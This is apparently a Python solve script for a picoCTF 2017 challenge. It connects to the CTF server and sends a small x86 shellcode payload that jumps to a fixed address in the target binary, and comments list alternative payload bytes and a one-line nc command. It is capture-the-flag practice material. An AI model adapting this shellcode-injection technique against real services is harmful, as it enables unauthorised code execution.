import socket

HOST = "shell2017.picoctf.com"
PORT = 55049

#python -c "print '\x33\xC0\x05\x40\x85\x04\x08\xFF\xE0'" | nc shell2017.picoctf.com 55049

payload = b'\x33\xC0\x05\x40\x85\x04\x08\xFF\xE0'

#"\x68\x40\x85\x04\x08\xC3"
#"\x68\x40\x85\x04\x08\xFF\x24\x24"
#"\x68\x40\x85\x04\x08\xFF\xE4"
#"\xB8\x40\x85\x04\x08\xFF\xE0"
#"\x33\xC0\x05\x40\x85\x04\x08\xFF\xE0"

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print(sock.recv(1024))
    print(sock.recv(1024))
    sock.sendall(payload)
    print(sock.recv(1024))
    print(sock.recv(1024))
    sock.close()

main()